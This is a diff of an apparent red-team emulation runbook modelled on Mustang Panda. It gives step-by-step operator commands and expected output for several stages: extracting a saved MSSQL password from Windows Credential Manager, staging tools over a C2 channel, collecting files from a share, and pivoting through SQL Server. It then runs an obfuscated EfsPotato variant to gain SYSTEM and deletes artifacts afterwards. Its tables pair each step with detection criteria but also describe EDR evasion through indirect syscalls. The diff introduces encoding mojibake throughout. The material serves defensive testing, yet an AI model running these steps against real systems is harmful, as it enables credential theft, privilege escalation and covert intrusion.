@@ -1,4 +1,4 @@
-# Phase 2 - Lateral Movement, Collection & Privilege Escalation (WS01 → IIS01)
+﻿# Phase 2 - Lateral Movement, Collection & Privilege Escalation (WS01 â†’ IIS01)
 
 ---
 
@@ -6,7 +6,7 @@
 
 ### Procedures
 
-- Verify TONESHELL C2 session and discovery complete - see Phase 1 Steps 1–2 completion criteria
+- Verify TONESHELL C2 session and discovery complete - see Phase 1 Steps 1â€“2 completion criteria
 - Stage `CertEnrollSvc.exe` to the `toneshell` handler payloads subdirectory - required by `xpstage-hex` (Step 4):
 
   ```bash
@@ -29,7 +29,12 @@
      resources/payloads/rce-and-c2/mustang-panda-emulation/payloads/toneshell/FwPolicySvc.exe
   ```
 
-- Confirm the `CredentialManager` PowerShell module is installed on `WS01` as `labuser` - see [`resources/setup/Windows Server 2022-MSSQL.md`](../resources/setup/Windows%20Server%202022-MSSQL.md) Step 6 verification block. Required for Step 1 credential extraction.
+- Stage `credvault.exe` to the controlServer payloads directory - required by the TONESHELL `put` in Step 1 (replaces the PowerShell `CredentialManager` module path - no NuGet install needed on WS01):
+
+  ```bash
+  cp resources/payloads/cred-access/credvault/credvault.exe \
+     resources/payloads/rce-and-c2/mustang-panda-emulation/payloads/credvault.exe
+  ```
 - Verify EFSSVC (`Encrypting File System`) is running on IIS01 - required for EFS named-pipe coercion in Step 4. See [`Windows Server 2022-MSSQL.md`](../resources/setup/Windows%20Server%202022-MSSQL.md) for service setup.
 
 ---
@@ -38,46 +43,68 @@
 
 ### Voice Track
 
-With IIS01 identified as a target, the adversary harvests the MSSQL password directly from Windows Credential Manager. The developer previously used SSMS on WS01 to connect to `iis01.testlab.local` as `svc_app_dev` with "Remember password" checked - SSMS 20 persists this as a `Generic` credential under a `LegacyGeneric:target=Microsoft:SSMS:20:...` entry. Because TONESHELL already runs inside `labuser`'s session, DPAPI decrypts the credential in-process with no offline cracking. The adversary first enumerates stored credentials with `cmdkey` to locate the SSMS entry, then calls `Get-StoredCredential` to extract the plaintext password.
+With IIS01 identified as a target, the adversary harvests the MSSQL password directly from Windows Credential Manager. The developer previously used SSMS on WS01 to connect to `iis01.testlab.local` as `svc_app_dev` with "Remember password" checked - SSMS 20 persists this as a `Generic` credential under a `LegacyGeneric:target=Microsoft:SSMS:20:...` entry. Rather than the well-known PowerShell path - the `CredentialManager` module needs a NuGet bootstrap the lab has no route to fetch, and `powershell.exe` running `Get-StoredCredential` is a heavily signatured telemetry surface - the adversary pushes a small custom Go utility through the existing TONESHELL file-transfer channel. Because TONESHELL runs inside `labuser`'s session, `credvault.exe` calls `CredEnumerateW` to list the vault and `CredReadW` against the SSMS entry in one pass (`dump`): advapi32 returns the decrypted blob in-session with no offline DPAPI cracking, and the tool prints the plaintext password straight to the C2 console - no PowerShell or `cmdkey.exe` spawn anywhere in the chain.
 
 ### Procedures
 
-1. Enumerate credentials in the current user's Credential Manager vault to identify the SSMS-saved entry:
+1. â˜£ï¸ Stage `credvault.exe` to WS01 through the TONESHELL file-transfer channel (payload pre-placed in the controlServer payloads directory in Step 0):
 
    ```
-   shell cmdkey /list
-   ```
-
-   - ***Expected Output*** (relevant excerpt)
-     ```text
-     Currently stored credentials:
-
-         Target: LegacyGeneric:target=Microsoft:SSMS:20:iis01.testlab.local:svc_app_dev:8c91a03d-f9b4-46c0-a305-b5dcc79ff907:1
-         Type: Generic
-         User: svc_app_dev
-         Local machine persistence
-     ```
-
-2. ☣️ Extract the plaintext password from the SSMS credential entry:
-
-   ```
-   shell powershell -c "$cred = Get-StoredCredential -Target 'LegacyGeneric:target=Microsoft:SSMS:20:iis01.testlab.local:svc_app_dev:8c91a03d-f9b4-46c0-a305-b5dcc79ff907:1'; $cred.UserName; $cred.GetNetworkCredential().Password"
+   put credvault.exe C:\Windows\Temp\credvault.exe
    ```
 
    - ***Expected Output***
      ```text
-     svc_app_dev
-     D3vPortal!2025
+     [*] file-put task <task-guid> queued, waiting for transfer ...
+     [+] file-put complete: implant:C:\Windows\Temp\credvault.exe
      ```
 
-3. Record `svc_app_dev` / `D3vPortal!2025` for use in Steps 2 and 3.
+2. Enumerate credentials in the current user's Credential Manager vault to identify the SSMS-saved entry:
+
+   ```
+   shell C:\Windows\Temp\credvault.exe enum
+   ```
+
+   - ***Expected Output*** (relevant excerpt)
+     ```text
+     Credential list: 1 entries
+
+     [0] LegacyGeneric:target=Microsoft:SSMS:20:iis01.testlab.local:svc_app_dev:8c91a03d-f9b4-46c0-a305-b5dcc79ff907:1
+         Type    : Generic
+         User    : svc_app_dev
+         Persist : LocalMachine
+     ```
+
+3. â˜£ï¸ Extract the plaintext password from the SSMS credential entry in-session:
+
+   ```
+   shell C:\Windows\Temp\credvault.exe dump Microsoft:SSMS
+   ```
+
+   - ***Expected Output***
+     ```text
+     Target   : LegacyGeneric:target=Microsoft:SSMS:20:iis01.testlab.local:svc_app_dev:8c91a03d-f9b4-46c0-a305-b5dcc79ff907:1
+     User     : svc_app_dev
+     Secret   : D3vPortal!2025
+     ```
+
+4. Record `svc_app_dev` / `D3vPortal!2025` for use in Steps 2 and 3.
+
+5. â˜£ï¸ Remove the tool from WS01:
+
+   ```
+   cmd /c del /f C:\Windows\Temp\credvault.exe
+   ```
 
 ### Reference Tables
 
 | Summary | Tactic | Technique ID | Technique Name | Platform | Detection Criteria | Category | Calibration Reason | Red Team Activity | Hosts | Users | Source Code Links | Relevant CTI Reports |
 | - | - | - | - | - | - | - | - | - | - | - | - | - |
-| cmdkey /list enumerates Windows Credential Manager vault on WS01 | Credential Access | T1555.004 | Credentials from Password Stores: Windows Credential Manager | Windows | `cmdkey.exe /list` spawned by a non-administrative parent process on WS01 - `cmdkey.exe` has no established baseline on this developer workstation | Calibrated - Not Benign | - | Red team runs `cmdkey /list` via TONESHELL shell to enumerate stored credentials and locate the SSMS-saved `svc_app_dev` entry | WS01 (10.12.10.30) | TESTLAB\labuser | - | - |
-| Get-StoredCredential reads SSMS-saved MSSQL password from Windows Credential Manager | Credential Access | T1555.004 | Credentials from Password Stores: Windows Credential Manager | Windows | `powershell.exe` (non-standard parent) executes script block containing `Get-StoredCredential` targeting a `LegacyGeneric:target=Microsoft:SSMS:` vault entry on WS01 - `CredRead` API call against SSMS credential store from a non-interactive process context | Calibrated - Not Benign | - | `Get-StoredCredential` (CredentialManager module) calls `CredRead` against the `LegacyGeneric:target=Microsoft:SSMS:20:...` entry, decrypting `D3vPortal!2025` via DPAPI in-session as `labuser` | WS01 (10.12.10.30) | TESTLAB\labuser | - | - |
+| TONESHELL FILE_DOWNLOAD transfers credvault.exe to C:\Windows\Temp\ on WS01 | Command and Control | T1105 | Ingress Tool Transfer | Windows | `EssosUpdate.exe` (TONESHELL implant) on WS01 writes a new PE file `credvault.exe` to `C:\Windows\Temp\` (Sysmon EC=11, creator `EssosUpdate.exe`) - a signed Microsoft binary acting as a C2 implant depositing an inbound non-Microsoft executable into the system temp directory, with no baseline for file-write activity from this process | Calibrated - Not Benign | - | TONESHELL implant receives FILE_DOWNLOAD (id=3) task and writes `credvault.exe` to `C:\Windows\Temp\` on WS01 | WS01 (10.12.10.30) | TESTLAB\labuser | [credvault](../resources/payloads/cred-access/credvault/) | - |
+| TONESHELL EXEC spawns credvault.exe on WS01 via CreateProcessW | Execution | T1106 | Native API | Windows | `EssosUpdate.exe` (TONESHELL implant) on WS01 spawns child process `C:\Windows\Temp\credvault.exe` via `CreateProcessW` with command line `enum` / `dump Microsoft:SSMS` - a signed Microsoft binary spawning a non-Microsoft PE from the system temp directory, with no baseline for `EssosUpdate.exe` child processes | Calibrated - Not Benign | - | TONESHELL implant runs EXEC task (id=5) spawning `C:\Windows\Temp\credvault.exe` - no `cmd.exe` wrapper | WS01 (10.12.10.30) | TESTLAB\labuser | [credvault](../resources/payloads/cred-access/credvault/) | - |
+| credvault.exe enumerates Windows Credential Manager vault via CredEnumerateW on WS01 | Credential Access | T1555.004 | Credentials from Password Stores: Windows Credential Manager | Windows | `credvault.exe` (non-Microsoft PE resident in `C:\Windows\Temp\`, parent `EssosUpdate.exe`) on WS01 performs Windows Credential Manager vault enumeration via `advapi32!CredEnumerateW` returning the full vault entry list - credential-store API usage from an unsigned temp-dir process with no baseline for vault enumeration on this developer workstation (baseline vault readers are interactive `cmdkey.exe`/SSMS only) | Calibrated - Not Benign | - | `credvault.exe` calls `CredEnumerateW` to list stored credentials and locate the SSMS-saved `svc_app_dev` entry - `cmdkey /list` equivalent without spawning `cmdkey.exe` | WS01 (10.12.10.30) | TESTLAB\labuser | [credvault](../resources/payloads/cred-access/credvault/) | - |
+| credvault.exe reads SSMS-saved MSSQL password in-session via CredReadW and emits plaintext to console | Credential Access | T1555.004 | Credentials from Password Stores: Windows Credential Manager | Windows | `credvault.exe` (non-Microsoft PE resident in `C:\Windows\Temp\`, parent `EssosUpdate.exe`) on WS01 issues `advapi32!CredReadW` with `CRED_TYPE_GENERIC` against target `LegacyGeneric:target=Microsoft:SSMS:` (in-session blob decryption) - SSMS credential-store read by a non-interactive temp-dir process; baseline SSMS credential decryption originates in the interactive SSMS/`sqlcmd` context of the developer user, never from an unsigned PE spawned by the implant chain | Calibrated - Not Benign | - | `credvault.exe` calls `CredReadW` against the `LegacyGeneric:target=Microsoft:SSMS:20:...` entry, decrypts `D3vPortal!2025` in-session as `labuser`, and prints user/secret to the C2 console - no PowerShell in the chain | WS01 (10.12.10.30) | TESTLAB\labuser | [credvault](../resources/payloads/cred-access/credvault/) | - |
+| TONESHELL EXEC del removes credvault.exe from C:\Windows\Temp\ on WS01 | Stealth | T1070.004 | Indicator Removal: File Deletion | Windows | `EssosUpdate.exe` on WS01 spawns `cmd.exe /c del /f C:\Windows\Temp\credvault.exe` - TONESHELL implant removing the dropped tool immediately after credential extraction; Sysmon EC=23/26 deletion of `C:\Windows\Temp\credvault.exe` within the same process chain that created and executed it, with no baseline | Not Calibrated - Not Benign | staging | WS01 implant runs EXEC task `cmd /c del /f C:\Windows\Temp\credvault.exe` removing the tool post-extraction | WS01 (10.12.10.30) | TESTLAB\labuser | - | - |
 
 ---
 
@@ -89,7 +116,7 @@ Holding the `svc_app_dev` credentials recovered in Step 1, the adversary sets th
 
 ### Procedures
 
-1. ☣️ Stage `go-thehash.exe` to WS01 through the TONESHELL file-transfer channel (payload pre-placed in the controlServer payloads directory in Step 0):
+1. â˜£ï¸ Stage `go-thehash.exe` to WS01 through the TONESHELL file-transfer channel (payload pre-placed in the controlServer payloads directory in Step 0):
 
    ```
    put go-thehash.exe C:\Windows\Temp\go-thehash.exe
@@ -101,7 +128,7 @@ Holding the `svc_app_dev` credentials recovered in Step 1, the adversary sets th
      [+] file-put complete: implant:C:\Windows\Temp\go-thehash.exe
      ```
 
-2. ☣️ Authenticate to IIS01 over Kerberos as `svc_app_dev` and recursively collect application configuration files from the `DevPortal` share:
+2. â˜£ï¸ Authenticate to IIS01 over Kerberos as `svc_app_dev` and recursively collect application configuration files from the `DevPortal` share:
 
    ```
    C:\Windows\Temp\go-thehash.exe -krb -dcip 10.12.10.10 collect iis01.testlab.local TESTLAB.LOCAL svc_app_dev "D3vPortal!2025" DevPortal . C:\Windows\Temp\loot "*.config,*.json"
@@ -133,7 +160,7 @@ Holding the `svc_app_dev` credentials recovered in Step 1, the adversary sets th
      ...          web.config
      ```
 
-4. ☣️ Remove the tool and the staging loot directory from WS01:
+4. â˜£ï¸ Remove the tool and the staging loot directory from WS01:
 
    ```
    cmd /c del /f C:\Windows\Temp\go-thehash.exe
@@ -163,7 +190,7 @@ Using the `svc_app_dev` credentials extracted from Windows Credential Manager in
 
 ### Procedures
 
-1. ☣️ In `toneshell_shell.py`, with WS01 session active - initialize the MSSQL execution channel:
+1. â˜£ï¸ In `toneshell_shell.py`, with WS01 session active - initialize the MSSQL execution channel:
 
    ```
    xpinit iis01.testlab.local:1433 svc_app_dev D3vPortal!2025
@@ -178,7 +205,7 @@ Using the `svc_app_dev` credentials extracted from Windows Credential Manager in
      [+] xpinit OK - context: nt service\mssql$sqlexpress
      ```
 
-2. ☣️ Deploy the xpagent in-database C2 agent on IIS01:
+2. â˜£ï¸ Deploy the xpagent in-database C2 agent on IIS01:
 
    ```
    xpagent init
@@ -216,13 +243,13 @@ Using the `svc_app_dev` credentials extracted from Windows Credential Manager in
 
 With the MSSQL execution channel established, the adversary stages the privilege escalation tool to IIS01 entirely through the database - no HTTP from IIS01, no WinRM, no lateral file copy. The controlServer hex-encodes `CertEnrollSvc.exe` (an obfuscated EfsPotato variant) and generates a T-SQL INSERT script that chunks the hex string as NVARCHAR rows. The TONESHELL implant on WS01 receives the SQL file via the C2 file-push channel, then sqlcmd bulk-inserts the hex chunks into a staging table in `tempdb`. A T-SQL batch on IIS01 concatenates the hex rows, converts the hex string to binary via `CONVERT(VARBINARY(MAX), @hex, 2)`, and writes the result to `C:\ProgramData\` through `sp_OA ADODB.Stream SaveToFile` - decode and write execute entirely in-process within `sqlservr.exe` with no PowerShell or `cmd.exe` spawn on IIS01. The staging table is then dropped and the SQL file deleted, leaving no intermediary artifact.
 
-With the binary on disk, the adversary invokes `CertEnrollSvc.exe` directly via `xprun` (sp_OA `WScript.Shell.Run` → `ShellExecuteEx`) - the process chain is `sqlservr.exe → CertEnrollSvc.exe` with no intermediate `cmd.exe`, bypassing both xpagent and xp_cmdshell. The tool runs as the MSSQL service account (`NT SERVICE\MSSQL$SQLEXPRESS`), which holds `SeImpersonatePrivilege`. It creates an attacker-controlled named pipe and coerces LSASS to connect by triggering `EfsRpcEncryptFileSrv` via the MS-EFSR interface at `\\localhost\pipe\{guid}...`. When LSASS connects, the tool captures the SYSTEM impersonation token via `FSCTL_PIPE_IMPERSONATE` and `NtOpenThreadToken`, duplicates it to a primary token via `NtDuplicateToken`, and spawns `cmd.exe` as `NT AUTHORITY\SYSTEM` via `CreateProcessWithTokenW`. The spawned command (`whoami /priv`) is redirected to a staging file in `C:\ProgramData\`, which is read back via `xpfile cat` (`OPENROWSET BULK` - native T-SQL, no cmd.exe spawn). Because the output file is created under `NT AUTHORITY\SYSTEM` ownership, the MSSQL service account cannot delete it directly - cleanup requires a second `xprun` CertEnrollSvc.exe escalation to `del /f` the file under SYSTEM context.
+With the binary on disk, the adversary invokes `CertEnrollSvc.exe` directly via `xprun` (sp_OA `WScript.Shell.Run` â†’ `ShellExecuteEx`) - the process chain is `sqlservr.exe â†’ CertEnrollSvc.exe` with no intermediate `cmd.exe`, bypassing both xpagent and xp_cmdshell. The tool runs as the MSSQL service account (`NT SERVICE\MSSQL$SQLEXPRESS`), which holds `SeImpersonatePrivilege`. It creates an attacker-controlled named pipe and coerces LSASS to connect by triggering `EfsRpcEncryptFileSrv` via the MS-EFSR interface at `\\localhost\pipe\{guid}...`. When LSASS connects, the tool captures the SYSTEM impersonation token via `FSCTL_PIPE_IMPERSONATE` and `NtOpenThreadToken`, duplicates it to a primary token via `NtDuplicateToken`, and spawns `cmd.exe` as `NT AUTHORITY\SYSTEM` via `CreateProcessWithTokenW`. The spawned command (`whoami /priv`) is redirected to a staging file in `C:\ProgramData\`, which is read back via `xpfile cat` (`OPENROWSET BULK` - native T-SQL, no cmd.exe spawn). Because the output file is created under `NT AUTHORITY\SYSTEM` ownership, the MSSQL service account cannot delete it directly - cleanup requires a second `xprun` CertEnrollSvc.exe escalation to `del /f` the file under SYSTEM context.
 
 ### Procedures
 
 **A - Stage CertEnrollSvc.exe to IIS01 via MSSQL database channel**
 
-1. ☣️ Stage `CertEnrollSvc.exe` to IIS01 via the DB channel (no HTTP from IIS01):
+1. â˜£ï¸ Stage `CertEnrollSvc.exe` to IIS01 via the DB channel (no HTTP from IIS01):
 
    ```
    xpstage-hex CertEnrollSvc.exe
@@ -232,12 +259,12 @@ With the binary on disk, the adversary invokes `CertEnrollSvc.exe` directly via 
    - controlServer hex-encodes `CertEnrollSvc.exe`, generates INSERT SQL file with hex NVARCHAR rows
    - SQL file transferred to `C:\Windows\Temp\` on WS01 via TONESHELL FILE_DOWNLOAD
    - WS01 runs `sqlcmd -i` to bulk-INSERT hex chunks into `tempdb..stg` on IIS01
-   - T-SQL batch on IIS01: concatenates hex rows + `CONVERT(VARBINARY(MAX), @hex, 2)` → `sp_OA ADODB.Stream SaveToFile` writes `CertEnrollSvc.exe` to `C:\ProgramData\` - entirely in-process within `sqlservr.exe`, no PowerShell or `cmd.exe` spawn on IIS01
+   - T-SQL batch on IIS01: concatenates hex rows + `CONVERT(VARBINARY(MAX), @hex, 2)` â†’ `sp_OA ADODB.Stream SaveToFile` writes `CertEnrollSvc.exe` to `C:\ProgramData\` - entirely in-process within `sqlservr.exe`, no PowerShell or `cmd.exe` spawn on IIS01
    - SQL file deleted from WS01; `tempdb..stg` dropped
 
    - ***Expected Output***
      ```text
-     [+] xpstage-hex done → C:\ProgramData\CertEnrollSvc.exe
+     [+] xpstage-hex done â†’ C:\ProgramData\CertEnrollSvc.exe
      ```
 
 2. Verify the binary landed on IIS01:
@@ -268,7 +295,7 @@ With the binary on disk, the adversary invokes `CertEnrollSvc.exe` directly via 
 
    > If stopped: `xpexec sc start EFS` then re-verify.
 
-4. ☣️ Execute EfsPotato privilege escalation:
+4. â˜£ï¸ Execute EfsPotato privilege escalation:
 
    ```
    xprun C:\ProgramData\CertEnrollSvc.exe "cmd /c whoami /priv > C:\ProgramData\sys_out.txt 2>&1" lsarpc
@@ -300,7 +327,7 @@ With the binary on disk, the adversary invokes `CertEnrollSvc.exe` directly via 
 
      > Full SYSTEM token - `SeDebugPrivilege`, `SeTcbPrivilege`, `SeCreateTokenPrivilege` all Enabled confirms `NT AUTHORITY\SYSTEM` context.
 
-6. ☣️ Delete the escalation output file (requires SYSTEM - file is owned by NT AUTHORITY\SYSTEM):
+6. â˜£ï¸ Delete the escalation output file (requires SYSTEM - file is owned by NT AUTHORITY\SYSTEM):
 
    ```
    xprun C:\ProgramData\CertEnrollSvc.exe "cmd /c del /f C:\ProgramData\sys_out.txt" lsarpc
@@ -322,18 +349,18 @@ With the binary on disk, the adversary invokes `CertEnrollSvc.exe` directly via 
 | TONESHELL FILE_DOWNLOAD transfers hex INSERT SQL staging file to C:\Windows\Temp\ on WS01 | Command and Control | T1105 | Ingress Tool Transfer | Windows | `EssosUpdate.exe` (TONESHELL implant) on WS01 writes a new file to `C:\Windows\Temp\` - a signed Microsoft binary acting as a C2 implant depositing an inbound payload to the system temp directory, with no established baseline for file-write activity from this process | Not Calibrated - Not Benign | transport | TONESHELL implant receives `FILE_DOWNLOAD` (id=3) task and writes hex-encoded INSERT SQL file to `C:\Windows\Temp\` on WS01 | WS01 (10.12.10.30) | TESTLAB\labuser | [toneshell_shell.py](../resources/payloads/rce-and-c2/mustang-panda-emulation/controlShell/toneshell_shell.py) | - |
 | sqlcmd.exe on WS01 bulk-INSERTs hex payload chunks into tempdb..stg on IIS01 via MSSQL channel | Lateral Movement | T1570 | Lateral Tool Transfer | Windows | `sqlcmd.exe` spawned by `EssosUpdate.exe` on WS01 executes with `-i C:\Windows\Temp\*.sql` against `10.12.10.20:1433` - a non-DBA, non-app-tier process bulk-inserting a SQL script file into IIS01 MSSQL via the database channel has no established baseline on this developer workstation | Calibrated - Not Benign | - | TONESHELL spawns `sqlcmd -i <sql_file>` on WS01 to bulk-INSERT hex-encoded payload chunks into `tempdb..stg` on IIS01 - database used as covert staging channel, no file written to IIS01 disk | WS01 (10.12.10.30) / IIS01 (10.12.10.20) | TESTLAB\labuser / sa | [toneshell_shell.py](../resources/payloads/rce-and-c2/mustang-panda-emulation/controlShell/toneshell_shell.py) | - |
 | WS01 implant spawns sqlcmd T-SQL batch CONVERT(VARBINARY,'0x'+@hex,1) hex-decodes tempdb..stg rows to raw binary on IIS01 | Stealth | T1140 | Deobfuscate/Decode Files or Information | Windows | N/A - C3: hex decode via T-SQL CONVERT(VARBINARY(MAX), '0x'+@hex, 2) executes entirely in-process within sqlservr.exe on IIS01 - no process creation, file write, registry, or network artifact from the decode step itself; the resulting binary write to disk is covered by the T1559.001 ADODB.Stream row | Not Calibrated - Not Benign | out-of-surface | T-SQL batch on IIS01: `SELECT @hex=@hex+CAST(chunk AS VARCHAR(MAX)) FROM tempdb..stg` concatenates hex rows, then `CONVERT(VARBINARY(MAX),'0x'+@hex,1)` decodes hex string to raw binary - entirely in-process within `sqlservr.exe`; no PowerShell or cmd.exe spawn; decode and COM write execute in the same T-SQL batch | IIS01 (10.12.10.20) | sa | [controlShell](../resources/payloads/rce-and-c2/mustang-panda-emulation/controlShell/) | - |
-| sp_OA ADODB.Stream hex-decodes tempdb..stg rows and writes CertEnrollSvc.exe binary to C:\ProgramData\ on IIS01 | Execution | T1559.001 | Inter-Process Communication: Component Object Model | Windows | `sqlservr.exe` creates `CertEnrollSvc.exe` in `C:\ProgramData\` on IIS01 via COM automation (`ADODB.Stream`) - MSSQL service has no baseline for writing PE binaries to the system data directory via OLE Automation; no PowerShell or `cmd.exe` spawn on IIS01 (xpstage-hex is entirely in-process); Sysmon EC=11 on `CertEnrollSvc.exe` with creator `sqlservr.exe` | Calibrated - Not Benign | - | WS01 sqlcmd invokes T-SQL batch on IIS01: concatenates hex rows from `tempdb..stg` → `CONVERT(VARBINARY(MAX),@hex,2)` → `sp_OACreate 'ADODB.Stream'` + `sp_OASetProperty Type 1` + `sp_OAMethod Write` + `sp_OAMethod SaveToFile C:\ProgramData\CertEnrollSvc.exe 2` - entire hex decode and binary write in-process within `sqlservr.exe`, no PowerShell or `cmd.exe` on IIS01 | IIS01 (10.12.10.20) | sa | [controlShell](../resources/payloads/rce-and-c2/mustang-panda-emulation/controlShell/) | - |
+| sp_OA ADODB.Stream hex-decodes tempdb..stg rows and writes CertEnrollSvc.exe binary to C:\ProgramData\ on IIS01 | Execution | T1559.001 | Inter-Process Communication: Component Object Model | Windows | `sqlservr.exe` creates `CertEnrollSvc.exe` in `C:\ProgramData\` on IIS01 via COM automation (`ADODB.Stream`) - MSSQL service has no baseline for writing PE binaries to the system data directory via OLE Automation; no PowerShell or `cmd.exe` spawn on IIS01 (xpstage-hex is entirely in-process); Sysmon EC=11 on `CertEnrollSvc.exe` with creator `sqlservr.exe` | Calibrated - Not Benign | - | WS01 sqlcmd invokes T-SQL batch on IIS01: concatenates hex rows from `tempdb..stg` â†’ `CONVERT(VARBINARY(MAX),@hex,2)` â†’ `sp_OACreate 'ADODB.Stream'` + `sp_OASetProperty Type 1` + `sp_OAMethod Write` + `sp_OAMethod SaveToFile C:\ProgramData\CertEnrollSvc.exe 2` - entire hex decode and binary write in-process within `sqlservr.exe`, no PowerShell or `cmd.exe` on IIS01 | IIS01 (10.12.10.20) | sa | [controlShell](../resources/payloads/rce-and-c2/mustang-panda-emulation/controlShell/) | - |
 | hex INSERT SQL file deleted from C:\Windows\Temp\ on WS01 and tempdb..stg dropped on IIS01 | Stealth | T1070.004 | Indicator Removal: File Deletion | Windows | `EssosUpdate.exe` spawns `cmd.exe /c del /f` to delete the hex INSERT SQL file from `C:\Windows\Temp\` on WS01 - TONESHELL implant removing the staging artifact post-transfer; IIS01-side `DROP TABLE tempdb..stg` is N/A - C3 (internal MSSQL T-SQL operation, off EDR surface) | Not Calibrated - Not Benign | staging | WS01 deletes hex INSERT SQL file via `cmd /c del /f`; WS01 sqlcmd issues `DROP TABLE tempdb..stg` on IIS01 - staging artifacts cleared | WS01 (10.12.10.30) / IIS01 (10.12.10.20) | TESTLAB\labuser / sa | - | - |
 | sp_OA WScript.Shell.Run dispatches CertEnrollSvc.exe directly on IIS01 (no cmd.exe) | Execution | T1559.001 | Inter-Process Communication: Component Object Model | Windows | `sqlservr.exe` on IIS01 spawns `CertEnrollSvc.exe` via OLE Automation (`sp_OACreate 'WScript.Shell'` + `sp_OAMethod Run`) - `sqlservr.exe` is the direct parent of `CertEnrollSvc.exe` with no intermediate `cmd.exe`; COM-based process creation from MSSQL service has no baseline on this IIS01 instance | Calibrated - Not Benign | - | `xprun` dispatches CertEnrollSvc.exe via sp_OA `WScript.Shell.Run` (ShellExecuteEx) - bypasses xpagent and xp_cmdshell; `sqlservr.exe` directly spawns `CertEnrollSvc.exe` on IIS01 with no `cmd.exe` in the chain | IIS01 (10.12.10.20) | NT SERVICE\MSSQL$SQLEXPRESS | [CertEnrollSvc.exe](../resources/payloads/priv-escalation/EfsPotato/) | - |
 | CertEnrollSvc.exe resolves sensitive Win32 APIs at runtime via GetProcAddress on IIS01; only GetModuleHandleW and GetProcAddress appear in static IAT | Stealth | T1027.007 | Obfuscated Files or Information: Dynamic API Resolution | Windows | `CertEnrollSvc.exe` (in `C:\ProgramData\`, child of `sqlservr.exe`) has a sparse static import table containing only `GetModuleHandleW` and `GetProcAddress` while at runtime calling `LoadLibraryW` to load `advapi32.dll` and `Rpcrt4.dll` and resolving sensitive token-theft and pipe APIs via `GetProcAddress` - YARA/capability signature on the PE file flags sparse-IAT binary in `C:\ProgramData\`; in-memory capability scan flags `GetProcAddress` resolving `NtOpenThreadToken`, `NtDuplicateToken`, `CreateNamedPipeW`, and `EfsRpcEncryptFileSrv` at runtime | Calibrated - Not Benign | - | CertEnrollSvc.exe loads advapi32 and Rpcrt4 via LoadLibraryW and resolves NtFsControlFile, NtOpenThreadToken, NtDuplicateToken, CreateNamedPipeW, CreateProcessWithTokenW, and EfsRpcEncryptFileSrv via GetProcAddress; no sensitive API names appear in the PE import table | IIS01 (10.12.10.20) | NT SERVICE\MSSQL$SQLEXPRESS | [CertEnrollSvc.exe](../resources/payloads/priv-escalation/EfsPotato/) | - |
 | CertEnrollSvc.exe allocates VirtualAlloc private page flipped to PAGE_EXECUTE_READ via VirtualProtect writing NtFsControlFile/NtOpenThreadToken/NtDuplicateToken indirect syscall trampolines on IIS01 | Stealth | T1620 | Reflective Code Loading | Windows | `CertEnrollSvc.exe` process on IIS01 contains a private executable memory region (VAD entry: MEM_PRIVATE, EXECUTE_READ, no file backing) created via `VirtualAlloc(PAGE_READWRITE)` + `VirtualProtect(PAGE_EXECUTE_READ)` - memory scanning flags a no-file-backing executable page in a process spawned from `sqlservr.exe`; RWX-lifecycle private allocation (write then flip to execute) detectable via ETW VirtualAlloc/VirtualProtect telemetry from a process with no established baseline for private code allocation | Calibrated - Not Benign | - | CertEnrollSvc.exe: `VirtualAlloc(PAGE_READWRITE)` allocates a private page, writes indirect syscall stubs for NtFsControlFile, NtOpenThreadToken, NtDuplicateToken, then `VirtualProtect(PAGE_EXECUTE_READ)` marks executable - VAD entry shows MEM_PRIVATE EXECUTE_READ with no file backing; token theft chain dispatched via these trampolines, bypassing advapi32 hook points | IIS01 (10.12.10.20) | NT SERVICE\MSSQL$SQLEXPRESS | [CertEnrollSvc.exe](../resources/payloads/priv-escalation/EfsPotato/) | - |
-| CertEnrollSvc.exe EfsPotato named-pipe impersonation: creates attacker pipe → coerces LSASS via EfsRpcEncryptFileSrv → captures and duplicates SYSTEM token | Privilege Escalation | T1134.001 | Access Token Manipulation: Token Impersonation/Theft | Windows | `CertEnrollSvc.exe` (running as `NT SERVICE\MSSQL$SQLEXPRESS`) creates a named pipe with GUID-format name (`\\.\pipe\{guid}`) and subsequently calls `NtOpenThreadToken` + `NtDuplicateToken` - named pipe impersonation sequence by a non-SYSTEM service binary in `C:\ProgramData\` on IIS01, detectable via file I/O pipe-creation event and native API monitoring kernel callbacks | Calibrated - Not Benign | - | `CertEnrollSvc.exe` executes the full EfsPotato chain: **(1)** creates a named pipe at `\\.\pipe\{guid}` (file I/O telemetry - pipe creation by a non-SYSTEM service process); **(2)** issues `EfsRpcEncryptFileSrv` RPC call targeting the `lsarpc` named pipe to force LSASS to connect to the attacker pipe (RPC/ETW telemetry - EFSSVC must be running); **(3)** calls `FSCTL_PIPE_IMPERSONATE` on the pipe handle, retrieves the SYSTEM impersonation token via `NtOpenThreadToken`, and duplicates it to a primary token via `NtDuplicateToken` (native API monitoring - kernel callback for token duplication sequence) | IIS01 (10.12.10.20) | NT SERVICE\MSSQL$SQLEXPRESS | [CertEnrollSvc.exe](../resources/payloads/priv-escalation/EfsPotato/) | - |
-| CertEnrollSvc.exe executes FSCTL_PIPE_IMPERSONATE, NtOpenThreadToken, NtDuplicateToken via indirect syscall trampolines bypassing advapi32 hook entry points on IIS01 | Stealth | T1134.001 | Access Token Manipulation: Token Impersonation/Theft | Windows | `CertEnrollSvc.exe` on IIS01 issues `NtFsControlFile` (FSCTL_PIPE_IMPERSONATE code), `NtOpenThreadToken`, and `NtDuplicateToken` via syscall stubs executing from a private EXECUTE_READ (no-file-backing) memory allocation - native API monitoring (kernel callback) observes the syscall return address pointing into the MEM_PRIVATE region rather than `ntdll.dll`, indicating direct-syscall dispatch; `advapi32.dll` hook entry points (`ImpersonateNamedPipeClient`, `DuplicateTokenEx`) are not invoked | Calibrated - Not Benign | - | Token capture and duplication chain executed via VirtualAlloc trampoline page - not advapi32 ImpersonateNamedPipeClient: NtFsControlFile (FSCTL_PIPE_IMPERSONATE) → NtOpenThreadToken → NtDuplicateToken invoked directly via syscall stubs; advapi32 hook intercept points bypassed on x64 | IIS01 (10.12.10.20) | NT SERVICE\MSSQL$SQLEXPRESS | [CertEnrollSvc.exe](../resources/payloads/priv-escalation/EfsPotato/) | - |
